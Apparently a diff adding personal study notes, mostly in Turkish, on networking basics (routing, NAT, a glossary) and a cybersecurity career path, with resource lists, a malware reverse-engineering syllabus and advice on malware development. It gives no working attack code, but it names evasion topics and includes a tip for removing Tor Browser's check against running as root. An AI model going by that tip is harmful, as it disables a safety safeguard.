+	Default route’ın yazılımı şu şekildedir;
+.
+	 0.0.0.0 0.0.0.0 192.168.1.1
+
+	burada ne olursa olsun paketleri 192.168.1.1’e at demek istiyoruz.
+
+	Routing’de bilinmesi gereken en önemli şeylerden biri de mask küçüldükçe önem derecesi daha da artar.
+
+	Örnek vererek incelersek;
+
+	Router 1 üzerinde 2 adet route mevcut.
+
+	PC0 192.168.10.13 IP’sine sahip bir hedef bilgisayara gitmek isterse, daha küçük maskli route olan R3’ü tercih edecektir. Bu çok önemli bir ayrıntıdır. Bir ağdaki en önemli routing bilgisinin /32 mask olduğunu böylece söyleyebiliriz.
+
+
+10- NAT  :
+
+	NAT bir ağda bulunan bilgisayarın, kendi ağı dışında başka bir ağa veya İnternete çıkarken farklı bir IP adresi kullanabilmesi için geliştirilmiş bir İnternet protokolüdür. Yani NAT bilgisayarın sahip olduğu IP adresini istenilen başka bir adrese dönüştürür. 
+	Bilgisayarlarımızın iç network üzerinde Private IP adresleri kullandığını biliyoruz. İç networkümüzde kullanmamız için ayrılan bu ip adresleri internette kullanılamazlar ve biz de bu ip adresleri ile internete erişemeyiz. Dolayısıyla internet ortamına girerken internet üzerinde yerimizi belli edecek sabit özel bir IP’ye ihtiyacımız var. 
+	İnternet ortamında kullanılan IP adreslere public IP adresi demiştik.
+
+	NAT yaparak Private IP’lerimizi Public IP’ye dönüştürüp internete çıkarken isteklerimizin geri dönmesini sağlamış oluruz. Buna en temel örnek evlerimizdeki modemdir. Modemler local IP’lerimizi internete çıkarken servis sağlayıcımızın bize verdiği Public IP’ye dönüştürerek internete çıkmamızı sağlar. 
+
+11- Terimler Sözlüğü :
+
+	ARP Address Resolution Protocol: RFC 826 ile tanımlanan, IP adresinden MAC adresini bulan protokoldür.
+
+	Bant genişliği: Ağ sinyalleri arasında kullanılan en yüksek ve en düşük frekanslar arasındaki aralık. Yaygın olarak, bir ağ protokolü veya ortamının, ölçülen throughput (yapılan iş) kapasitesine işaret eder.
+
+	Binary: Birleri ve sıfırları kullanan, iki-karakter bir numaralama yöntemi. İkili numaralama sistemi, bilgilerin tamamen dijital gösterimi temeline dayanır.
+
+	Bit: Bir 1 veya 0 olan ikili sayı. Sekiz bit, bir byte yapar.
+
+	Bridge: Bir ağdaki iki segmenti bağlamak ve aralarında paketleri aktarmak için bir cihaz. Her iki segment, iletişim kurabilmek için aynı protokolleri kullanmak zorundadır. Bridge’ler, OSI referans modelinin 2.katmanı, Veri Hattı katmanında çalışırlar. Bridge’in amacı, gelen bir frame’i, MAC adresine bağlı olarak filtrelemek, göndermek ve yaymaktır.
+
+	Broadcast Domain: Gruptaki herhangi bir cihazdan başlatılan broadcast frame’lerini alan cihazların bir grubudur. Router’lar broadcast frame’lerini iletmediklerinden, broadcast domain’leri bir broadcast’ten diğerine iletilmezler.
+
+	CIDR Classless Inter-Domain Routing: Bir IP ağ grubunun, diğer ağlara, birleşik, daha geniş olarak görünmesine izin verir. CIDR’da, IP adresleri ve subnet mask’lar, noktalarla ayrılmış 4 oktet ve sonuna maskelenen bitleri temsil eden rakamın eklendiği bir adres olarak yazılmaktadır. (Bir subneti temsil eden kısaltma şekli).
+
+	Collision Domain: Çarpışan frame’lerin tespit edildiği ethernet’teki ağ alanı. Collision’lar, hub ve repeater’lar ile yayınlanır, fakat LAN switch ve router’larla yayınlanmazlar.
+
+	Collision: Ethernet’te aynı anda aktarım gönderen iki düğümün etkisi. Fiziksel ortamda karşılaştıklarında, her bir düğümden frame’ler çarpışacak ve hasar görecektir.
+
+	Connectionless (bağlantısız): Bir sanal devre yaratmaksızın olan veri transferidir. Düşük ek yüke sahiptir, en güçlü taşımayı kullanır ve güvenli değildir.
+
+	Connection-Oriented (bağlantı-tabanlı): Herhangi bir veri transfer edilmeden önce sanal bir devre oluşturan, veri transfer yöntemi. Güvenli veri transferi için onay ve akış kontrolü kullanır. Connectionless ile zıttır. 
+
+	Crossover Kablo: Bir switch’i switch’e, kullanıcıyı-kullanıcıya, hub’ı hub’a veya switch’i hub’a bağlayan Ethernet kablo çeşididir.
+
+	Data Link Katmanı: OSI referans modelinin 2. katmanı, fiziksel bir hat üzerinde güvenli veri aktarımından emin olur ve öncelikle, fiziksel adresleme, hat disiplini, ağ topolojisi, hata uyarısı, istenilen frame’lerin taşınması ve akış kontrolü sağlar. IEEE, bu katmanı, MAC alt katmanı ve LLC alt katmanı olarak daha çok sayıda bölümlemiştir. Aynı zamanda Link Katmanı olarak da bilinir.
+
+	Deencapsulation: Bir katmanın, alt katmandan gelen Protocol Data Unit’deki (PDU) başlık bilgisini sildiği, katmanlaşmış protokoller tarafından kullanılan teknik.
+
+	Default Route: Routing tablosunda bir sonraki hop’un belirtilmediği frame’leri yöneltmek için kullanılan static routing tablo girişi.
+
+	DNS Domain Name System: Host isimlerini IP adreslerine çözmek için kullanılır.
+
+	Enkapsülasyon: Bir katmanın, üzerindeki bir katmandan Protocol Data Unit’e (PDU) başlık bilgisini eklediği, katmanlı protokol tarafından kullanılan teknik. Örneğin, internet terminolojisinde, bir paket, Network katmanından (IP) bir başlık, Transport katmanından (TCP) bir başlık, uygulama protokol bilgisi ilave edilen bir Data link katmanı başlığı içerebilir.
+
+	Ethernet: Xerox Corporation tarafından oluşturulan ve daha sonra Xerox, Digital Equipment Corporation ve Intel’in müşterek katkılarıyla geliştirilen bant tabanlı bir düzenlemedir. Ethernet, IEEE 802.3 serisi standarda benzerdir ve CSMA/CD kullanarak, 10Mbps’de çeşitli kablo türleri üzerinde çalışır. Aynı zamanda, DIX (Digital/Intel/Xerox) Ethernet olarak bilinir. Ayrıca bakınız: 10BaseT, Fast Ethernet ve IEEE.
+
+	Fast Ethernet: 100Mbps hızında bir Ethernet düzenlemesidir. Fast Ethernet, MAC mekanizmaları, MTU ve frame formatı gibi özellikler korunarak, 10BaseT den 10 kat daha hızlıdır. Bu benzerlikler onu, Fast Ethernet ağlarında, mevcut 10BaseT uygulamaları ve yönetim araçları ile uyumlu kılar. Fast Ethernet, IEEE 802.3 düzenlemesinin bir uzantısına dayanmaktadır.
+
+	Frame: Bir aktarım ortamına Data Link katmanı tarafından gönderilen bilginin mantıksal bir birimi.
+
+	FTP File Transfer Protocol: Ağ düğümleri arasında dosya aktarılması için kullanılan bir TCP/IP protokolüdür. Geniş bir dosya çeşidi aralığını destekler ve RFC 959’la tanımlıdır.
+
+	Handshake: Senkronize operasyonlardan emin olmak için ağdaki bir veya daha fazla cihaz arasında gidip gelen aktarımların bir serisi.
+
+	Hop sayısı: Yoldaki router’ların sayısına bağlı, bir kaynak ve bir hedef arasındaki uzaklığı hesap eden bir routing metriği. RIP, tek metriği olarak hop sayısını kullanır.
+
+	Hub’lar: Gerçekte sadece çok portlu repeater olan physical katman cihazlarıdır. Bir porttan elektronik dijital bir sinyal alındığında, sinyal, tekrar kuvvetlendirilir, tekrar üretilir ve sinyalin alındığı segment dışındaki tüm segmentlere gönderilir.
+
+	IEEE (Institute of Electrical and Electronics Engineers): Diğer aktiviteleri arasında, ağ kurulumu ve haberleşmeyi de içeren, bilgi işlem ve elektronikteki birçok alanın standartlarını tanımlayan, profesyonel bir organizasyondur. IEEE standartları, endüstride bugün kullanılan hakim LAN standartlarıdır. Birçok protokol, yaygın olarak, uygun IEEE standardının referans numarasıyla bilinmektedir.
+
+	Internet: Popülaritesi, 1990’ların ortasında yayılmaya başlayan, evrensel ağların ağıdır. Orijinal olarak, ortak akademik araştırma için bir araç olan internet, tüm bilgi çeşitlerinin değiş tokuş edildiği ve dağıtıldığı bir ortam oldu. İnternetin, tamamen farklı bilgisayar platform ve teknolojilerine bağlanma ihtiyacı, tek tip protokol ve standart gelişimine öncülük yaptı ki aynı zamanda firma LAN’larında yaygın olarak kullanılması başladı.
+
+	IP Adresi: Sık olarak bir internet adresi olarak belirtilir. Bu, internetteki (veya herhangi bir TCP/IP ağında) herhangi bir cihazı (host) eşsiz olarak tanımlayan bir adrestir. Her bir adres, noktalarla ayrılan desimal numaralar olarak gösterilen dört oktetten oluşmaktadır (“noktalı-desimal” olarak bilinen bir format). Her adres, bir ağ numarası, isteğe bağlı bir alt ağ ve bir host numarasından oluşmuştur.
+		   Host adresi, ağ veya alt ağdaki özel bir düğümü adreslerken, ağ ve alt ağ numaraları, beraber, routing için kullanılmaktadır. Ağ ve alt ağ bilgisi, subnet maskesi kullanılarak IP adresinden çıkarılır. A’dan C’ye klasların, adreslerin ağ, alt ağ ve host bölümlerine farklı bitler ayırdığı, beş IP adres klası vardır (A-E). Ayrıca bakınız: CIDR, IP ve subnet maskesi.
+
+	IP Internet Protokolü: RFC 791 de tanımlı, TCP/IP yığının parçası ve bağlantısız servis öneren bir Ağ katmanı protokolüdür. IP, adresleme, servis tipi teknik özellikleri, parçalama ve tekrar bir araya getirme ile güvenlik için özelliklerin düzenlenmesini sağlar.
+
+	IP Multicast: Bir kaynaktan çeşitli uç noktalara veya çoklu kaynaklardan birçok hedefe IP trafiğinin tekrar çoğaltılmasını mümkün kılan bir routing tekniği. Her özel hedef noktasına bir paket yerine, grup için sadece bir IP uç noktası belirtilen bir multicast grubuna bir paket gönderilir.
+
+	Katman: Ağdaki aktarım için verinin enkapsüle edilmesinde, OSI modelinin nasıl çalıştığını hiyerarşik olarak belirtmek için kullanılan terim.
+
+	LAN: Lokal area network: Yaygın olarak, limitli coğrafi bir alandaki (birkaç kilometreye kadar) ilgili cihazlar ve iki ya da daha fazla bilgisayarı bağlayan bir ağ. LAN’lar, tipik olarak, bir firmadaki, yüksek-hızlı, düşük-hatlı ağlardır. OSI’nin Fiziksel ve Veri Hattı katmanlarındaki kablolama ve sinyalleşme, LAN standartları tarafından dikte edilmektedir.
+
+	LAN Switch: Genel olarak, özellikle bir Ethernet switch olarak belirtilen, veri hattı segmentleri arasındaki paketleri aktaran, yüksek-hızlı, çoklu interface’i olan bir köprüleme mekanizmasıdır. LAN switch’ler, MAC adres tabanlı trafiği transfer ederler.
+
+	MAC Adresi: Bir LAN segmentine bağlanmak için gerekli tüm port ve cihazların bir Data link katmanı donanım adresi. Bu cihazlar mantıksal adreslerin doğru lokasyonu için ağdaki cihazlar tarafından kullanılmaktadır. MAC adresleri, IEEE standartları tarafından tanımlanmaktadır ve tipik olarak lokal LAN arayüzlerinde burned-in address (BIA) kullanılır, 48 bit uzunluğundadır. 
+		    Farklı şekillerde adlandırılan donanım adresleri, fiziksel adres, burned-in adresi veya MAC katmanı adresidir.
+
+	MAC Media Access Control: Donanım adreslemesi, ortam erişimi ve frameler için hata tespitinden sorumlu, Data link katmanının alt katmanı.
+
+	Maksimum Hop Sayısı: Sonlandırılmadan önce, bir paketin aktarılmasına izin verilen router’ların sayısı. Bu, bir paketin bir ağda sonsuza kadar dönmesini engellemek için oluşturulmuştur.
+
+	Multicast: Yaygın olarak, tek bir verici ile çoklu alıcılar arasındaki bir bağlantıdır. Broadcast adreslerin aksine, ağdaki tüm adreslere gönderilen, multicast mesajlar, ağ adreslerinin tanımlı bir altkümesine gönderilir, bu altküme, paketin hedef adresinde gösterilen bir grup multicast adresine sahiptir.
+
+	NAT Network Address Translation: Evrensel benzersiz IP adres gereksinimlerini minimize etmekte faydalı bir algoritma. Kuruluşlara, public olmayan adreslerini, evrensel yönlenebilir adres aralığına çevirmeleri imkanı verir.
+
+	Native VLAN: Cisco switch’lerin hepsi, VLAN1 olarak adlandırılan bir native VLAN’e sahiptir. Bu, herhangi bir yolla silinemez ve değiştirilemez. Tüm switch portları, varsayılan olarak VLAN1’dedir.
+
+	Oktet: Noktalı, ondalıklı bir IP adresinin bir bölümünü tanımlamak için kullanılan 8-tabanlı numaralama sistemi. Ayrıca, byte olarak da belirtilir.
+
+	OSI Open Systems Interconnection: Farklı üretici ekipmanlarının birlikte çalışabilirliğini gerçekleştiren, veri ağı kurulumu standartlarının gelişimi için ISO ve ITU-T tarafından geliştirilen uluslararası standartlaştırma programı.
+
+	OSI Referans Modeli Open Systems Interconnection Referans Modeli: Cihazların herhangi bir kombinasyonunun, iletişim amacıyla nasıl bağlanabileceğini açıklayan, International Organization for Standardization (ISO) tarafından tanımlanan kavramsal bir modeldir. OSI modeli, görevleri, en üstte uygulamaların, en altta fiziksel ortamın bulunduğu bir hiyerarşi oluşturan yedi fonksiyonel katmana böler ve her bir katmanın sağladığı fonksiyonları tanımlar.
+
+	OUI Organizationally Unique İdentifier: Network Interface kartı yapan bir kuruluşa IEEE tarafından tahsis edilen koddur. Daha sonra kuruluş bu OUI’yı ürettiği tüm kartlara koyar. OUI, 3 byte (24 bit) uzunluğundadır. Sonra üretici, istemciyi eşsiz olarak tanımlamak için 3-byte tanıtıcı ekler. Adresin toplam uzunluğu 48 bittir (6 byte) ve donanım ya da MAC adresi olarak bilinir.
+
+	Paket Switching: Paketlerle veri aktarım tabanlı bir ağ kurulumu teknolojisidir. Sürekli bir iletişimi ufak birimlere-paketlere bölmek, bir ağdaki çoklu cihazlardaki veriyi, eşzamanlı aynı iletişim kanallarına paylaştırmayı mümkün kılar, fakat ayrıca tam routing bilgisinin kullanımı gerekmektedir.
+
+	Paket: Veri iletişiminde, transfer edilen bilginin temel mantıksal birimidir. Bir paket, paketin nereden geldiği, nereye gittiği ve saire hakkında bilgiler içeren başlık ve/veya kuyrukta paketlenmiş ya da enkapsüle edilmiş, belirli sayıda veri byte’larından oluşmaktadır. Bir iletim göndermekle görevli çeşitli protokoller, daha sonra alıcı cihazlardaki ilgili protokollerin işledikleri, kendi katmanlarının başlık bilgilerini eklerler.
+
+	Physical Katman: OSI referans katmanındaki en alttaki katman (katman 1). Veri frame’lerini, Data Link katmanından (katman 2) elektrik sinyaline çevirmekten sorumludur. Physical katman protokolleri ve standartları, örneğin, pin atamaları ile 0 ve 1 değerinde sinyalleşme için şifreleme planlaması içeren, kablo ve konnektörleri tanımlar
+
+	Router: Ağ trafiğinin aktarımında kullanmak için en iyi yola karar vermekte bir veya daha fazla metrik kullanan, donanımsal veya yazılımsal bir Network katmanı mekanizması. Router’lar tarafından ağlar arasında paketler göndermek, Network katmanında sağlanan bilgiye bağlıdır. Geçmişte bu cihaz bazen bir gateway olarak belirtilmiştir.
+
+	Sequencing: Sanal devrelerde ve segment’leri numaralamak için bölümlenmesinde kullanılır, böylece doğru sırayla tekrar geri konulabilirler.
+
+	Subnetwork (Alt ağ): Geniş bir IP ağının parçası olan bir ağdır ve bir subnet adresi tarafından tanımlanmaktadır. Bir ağ yöneticisi, hiyerarşik, çok seviyeli bir routing yapısı sağlamak ve aynı zamanda bağlı ağların adresleme karmaşıklığından alt ağı korumak için bir ağı segmentlerine ayırır. Ayrıca bir subnet olarak da bilinir.
+		
+	Switch (1): Ağ kurulumunda, frame filtreleme, yayma ve gönderme gibi çoklu fonksiyonlardan sorumlu bir cihazdır. Özel frame’lerin hedefini kullanarak çalışır. Switch’ler OSI modelinin Data Link katmanında çalışır. (2) Yaygın olarak, ihtiyaç duyulduğunda kurulan ve artık ihtiyaç olmadığında sonlandırılan bağlantılara izin verilen elektronik/mekanik bir cihaz.
+
+	Telnet: TCP/IP protokol ailesinde standart terminal emülasyon protokolü. Uzak terminal bağlantı yöntemi, kullanıcıların uzak ağlarda login olmalarını mümkün kılar ve lokal olarak bağlanır gibi, bu kaynakları kullanırlar.
+
+	TFTP Trivial File Transfer Protocol: Kavramsal olarak, FTP’nin kısıtlı versiyonudur. Ne istediğinizi ve nerede bulunacağını tam olarak bilip bilmeme seçeneğinin protokolüdür. TFTP, FTP’nin sahip olduğu fonksiyon zenginliğini içermez. Özellikle, directory arama özelliği yoktur, dosyaları alıp göndermek dışında hiçbir şey yapamaz.
+
+	TTL Time to live: Bir paketin geçerli olduğu zamanı belirten, IP başlığındaki bir alan.
+
+	UDP User Datagram Protocol: Basit olarak, onay veya taşıma garantisi olmaksızın datagramların değiş tokuş edilmesine izin veren, TCP/IP protokol yığınındaki, bir connectionless transport katman protokolüdür,. UDP, RFC 768’de tanımlıdır.
+
+	UTP Unshielded twisted-pair: Kullanıcı cihazlarını switch ya da hub’a bağlamak için küçükten-genişe ağlarda kullanılan, bakır kablolaması. Ayrıca switch’i-switch’e veya hub’ı hub’a bağlamakta da kullanılır.
+
+	VLAN Virtual LAN: Bir veya daha fazla mantıksal segmentlere ayrılmış LAN’da (yönetim yazılımı kullanılarak yapılandırılan) cihazlar grubu. Cihazların, gerçekten çok farklı LAN segmentlerinde bulunduklarında, aynı fiziksel ortam aracına bağlıymış gibi iletişimde olmalarını mümkün kılar. VLAN’ler, fiziksel bağlantılar yerine mantıksal tabanlıdırlar ve bundan dolayı çok esnektirler.
+
+
+
+
+
+Not: Tor browser setup shouldnt run as root hatası çözümü :
+
+	-Browser klasörüne git
+	-start-tor-browser dosyasını aç 
+	-hatayı veren koşul kısmına gel
+	-koddaki 0'ı 1 yap veya if kısmını sil
+
+
+
+
+
+
+
+
+-Bilgi güvenliği kavramları :
+	
+	-Bütünlük : Bilginin doğru ve eksiksiz olması,bilgide yapılan değişikliklerin tutarlı olması
+		    bilgiyi değiştirememe veya silememe
+
+	-Erişilebilirlik : İhtiyacı olan bilginin istediği zaman ulaşılabilmesi veya kullanılabilmesi
+
+	-Gizlilik : Bilginin sadece yetkili personel tarafından erişilmesi ve bilinmesi
+
+	Not: Aşırı fazla güvenlik esnekliği ve kullanılabilirliği düşürür
+
+
+
+	===================================================================================================================================
+							Genel Notlar ve Kaynaklar
+	===================================================================================================================================
+Dip Not: POC ara
+Zafiyet tehdit risk
+Ping hangi portu ve protokulü kullanır
+MD5 SHA1 IS arasındaki farklar
+Veritabanında parola saklamak gerekirse nasıl saklanmalı
+OWASP nedir Ençok bilinen 5 güvenlik açığı sırala
+SSL TLS HTPS kavramlar bil kavra
+IPS IDS arasındaki fark
+Simetrik Asimetrik şifreleme arasındaki fark
+FTPS ve Secure FTP arasındaki fark
+WhiteBox ve BlackBox nedir ne bilinir bu durumlarda
+Web sunucuların yanıt kodları
+Web App Firewall
+DDos Dos
+chmod ?
+OSI katmanları
+Nest PSIDS 
+ARP poisoning
+Three-way-handshake
+TCP-UDP kullanım alanları
+Encoding Encryption ve Hashing kullanım alanı ve farkları
+foreisgn yapıları riskte kimi uyarırsın vs
+
+Sertifikalar
+
+IT - comptia a+ Professor Messer's CompTIA A+ 220-1001 and 220-1002 Traning course || CBTnuggets Comptia Kursu
+Network - Proferssor Messer's | cbt nuggets | Udemy Mike Meyers Total : Comptia Network | Cisco Packet Tracer
+
+
+
+
+
+
+
+
+ corelanc0d3r
+ cyber struggle
+Akademik Bilişim ve Linux Yaz Kampı. Öte yandan Hacktrick ekibi
+Linux - linuxjourney.com | OwerTheWire 
+Coding - python3 codeacademy | teamtreehouse | freeCodeCamp 
+hacking basics Full ethical hacking course cybermentor youtube | tryhackme | ctftime
+Active Directory - Top five Ways I got Domain Admin on Your Internal Network before Lunch 2018 edition - Adam Toscher | Pentester Academy Red Team Labs| Zero point security Red Team Ops | adsecurity.org
+Web App Hacking - hacker101.com | portswigger web security academy | bugcrowd university | pentesterlab | beginner Web app hacking Cybermentor youtube | owasp.org Web testing security guide | hackerone 
+Wireless Hacking - aircrack-ng.org
+Sertifikalar - OSCP(önemli), 
+Exploit Development - Cyber Mentor buffer overflows made easy | tryhackme buffer overflow prep | TCM security blog | Live overflow youtube |GynvaelColdwind youtube 
+Privelege Escalation - TCM security windows/linux privelege escalation | 
+Youtube Kanalları - The Cyber Mentor | John Hammond | Joe Helle | Stefan Rows | DC CyberSec | HackerSploit | NullByte | sup3rhero1 | Ash_F0x
+		    NahamSec | STÖK | InsiderPhD | The XSS Rat | Codingo | PwnFunciton | Farah Hawa
+Topluluklar : TCM Discord | NetSecFocus | NahamSec Discord | 
+
+Blog postu : https://tcm-sec.com/so-you-want-to-be-a-hacker-2021-edition/
+
+
+
+
+
+
+
+
+------------------------------Malware ----------------------------------
+
+Day 1: Introduction to malware analysis and reverse engineering
+	Day one focuses on the fundamental knowledge required for malware analysis and reverse engineering. This day is designed to build critical skills required to proceed further into deeper discussions on reversing. You will also train on special-purpose reversing debuggers and disassemblers. Lab exercises will focus on the functionality of various reversing tools and basic static and dynamic analysis processes.
+
+	Basic static and dynamic analysis
+	Reverse engineering concepts and legality
+	Machine code
+	Assembly language
+	System- and code-level reversing
+	Assembly basics (registers, operands, instructions)
+	Fundamentals of reverse engineering tools (IDA Pro, Radare2)
+Day 2: Static and dynamic analysis
+	Day two encompasses a deep discussion with hands-on content for reversing Windows binaries. Key concepts include identifying code paths, control functions and developing a general understanding of the code to be analyzed. Debugging concepts are introduced and practiced in hands-on lab exercises.
+
+	Recognizing C Code constructs in assembly
+	Windows API
+	Windows Registry
+	Network APIs
+	DLLs
+	Processes, threads and services
+	Debugging process (stepping, breakpoints, modifying execution)
+	Kernel debugging
+	Debugging tools
+Day 3: Analyzing malware functionality and behavior
+	Day three includes detailed coverage on reverse engineering malware. Focus is on live malware reversing using examples of viruses, Trojans and rootkits collected from the wild.
+
+	Understanding common malware types and functionality
+	Process injection and replacement
+	DLL injection
+	Direct, hook and APC injection and other malware launching technique
+	Registry persistence
+	Svchost.exe
+	Trojanized system binaries
+	DLL load order hijacking
+	Malware network behavior analysis
+	Kernel mode rootkits (SSDT hooking, interrupts)
+	User mode rootkits
+
+Day 4: Anti-reversing techniques
+	Day four works with various anti-reversing techniques that software developers and malware writers put in place to make reverse engineering more difficult.
+
+	Basic anti-reversing strategies
+	Anti-disassembly
+	Detecting debuggers
+	Detecting VM presence
+	Analyzing packed executables
+	Popular packers (UPX, PECompact, ASPack, etc.)
+	Simple obfuscation techniques (XOR swap, junk code, etc.)
+	Obscuring through data flow and control flow
+	Constant unfolding
+	Deobfuscation tools
+	Base64 and other encoding schemes
+	Common ciphers and encoding schemes
+	Reversing ransomware
+
+Day 5: Advanced reversing topics & CREA exam
+	Day five covers advanced reversing topics as well as the CREA exam. The day ends with you taking the CREA exam.
+
+	Recognizing C++ binaries
+	Identifying constructors and destructors
+	RTTI
+	64-bit architecture
+	WoW64
+	64-bit analysis
+	CREA exam overview
+	CREA exam
+
+
+
+2-	IDA Pro, WinDbg, OllyDbg, Immunity Debugger
+	Strong knowledge of C/C++, Windows API, and Windows OS internals
+	Reconstruct unknown file formats & data structures
+	Reconstruct unknown TCP/IP protocols
+	Understand unpacking, deobfuscation, and anti-debugging techniques
+	Python, Perl, Ruby scripting
+	Ability to write technical reports
+ 
+
+
+3-Being a Malware Analyst can take you many different places during your career and you can end up analyzing all types of malware, from normal application malware to exploits hidden in PDF files or 
+malware found on smart phones. So where should you start when it comes to your training? You should master a few basics before trying anything too advanced:
+
+Learn Assembly Language
+
+In the hierarchy of programming languages, you have at the very top scripting languages like PERL or Python, 
+followed by high and middle level languages like C++, C. Followed down by Assembly language, machine language and finally binary code which is read by the hardware.
+
+Learn how to use the tools
+
+The tools of a Malware Analyst are incredibly important and usually one of the first things learned. Here is a list of the types of tools required and some examples of them:
+
+Dissasembler – IDA Pro
+Debugger – OllyDbg, WinDbg
+System Monitor – Process Monitor, RegShot. Process Explorer
+Network Monitor – TCP View, Wireshark
+Packer Identifier – PEID
+Unpacking Tools – Qunpack. GUNPacker
+Binary Analysis Tools – PE Explorer, Malcode Analysts Pack
+Code Analysis Tools – LordPE, ImpRec
+
+There are many different ways to learn about becoming a Malware Analyst; some people choose to go through courses taught online or in person, which can cost upwards of a few thousand dollars. 
+Other people choose to learn as they go, picking up information where they can and learning from their own experience.
+
+
+
+4- Malware development sits on the pinnacle of programming. You start by learning C, a lot of C. You learn things about C that the average developer couldn’t dream of, nor do they need to understand. 
+You learn about data types and all the weird edge cases associated with data types. You’re going to need to learn about various structures that exist in your runtime environment.
+
+And once you think you know C, you learn that you knew nothing because you start learning about compiler architecture, Executable file formats, compiler flags. All just to become a programmer that might start to know enough to be a malware developer. 
+And then you’re going to need to up your game; at this point, you may be in the top 1% of programmers, 
+but you're one of the 99% of malware devs, and no one will be impressed with your malware sample when it's detected via heuristics in two seconds.
+
+You're going to need to learn assembly, A LOT of assembly. at&t syntax, 8086, Intel AMD. they are different syntax’s, and by the end of your journey, you should be able to spot any one of them.
+
+You're going to need to learn Python, and you better know python like the back of your hand. by the end of your journey, you should sit in the 1% of the 1% of programmers. And you still won’t be good enough.
+
+If you’re going to be a good malware dev, you’ll need to dedicate a lot of time learning about vulnerability discovery and exploit development, cryptography, network stacks, various protocols, anti-reverse engineering, anti-virus detection evasion, 
+firewall bypass techniques, hooking device drivers, modes of operation(User/Kernel/Hypervisor), processor architecture, virtual machine detection/escape. You become a malware developer by being in the top .0001% of programmers.
+
+Yeah, a lot of crappy programmers write malware, but you never hear about it because a lot of excellent programmers have spent a lot of time thinking about how to detect crapware written by the mediocre.
+
+There is no easy way. You're either good enough, or you’re not. And if you’re starting from 0, you have a long way to go until you’re good enough.
+
+
+
+
+ You need to know Assembly, both the Intel and AT&T Syntax Assembly for both x86 and x64 
+
+
+Disassembler – IDA Pro
+Debugger – OllyDbg, WinDbg
+System Monitor – Process Monitor, RegShot. Process Explorer
+Network Monitor – TCP View, Wireshark
+Packer Identifier – PEID
+Unpacking Tools – Qunpack. GUNPacker
+Binary Analysis Tools – PE Explorer, Malcode Analysts Pack
+Code Analysis Tools  – LordPE, ImpRec
+
+
+
+
+
+At the beginning, we’d manually process loads of legacy DOS viruses – because we needed to have detection for those to earn some certifications. 
+These were fun times: studying 20+ viruses per day is the equivalent of playing poker online, at 5 different tables at once: you play a LOT of hands, 
+and gain experience faster,” he shares.
+
+
+
+
+
+
+Go to INE dot com and search their website for pen testing courses. They offer up to 100 hours of free training (after that you can access hundreds of more hours for a subscription.) They have a basic pen testing course clear up to master. Participate in CTFs (Capture the flags.) These are completely legal ways to practice white hat hacking, legally and for free. If you ever want to get a job as a white hat, these CTF experience will mean a LOT to a employer looking to hire a newbie. For white hat hacking you don't need to worry about TOR (at least to start, unless you just personally want to be private.) There are clearnet forums devoted to these topics.
+
+But back to the start, learn the pen testing basics from INE dot com. Then do CTFs, ALL THE TIME. Practice makes perfect and CTFs are going to be how you learn the fastest.
+
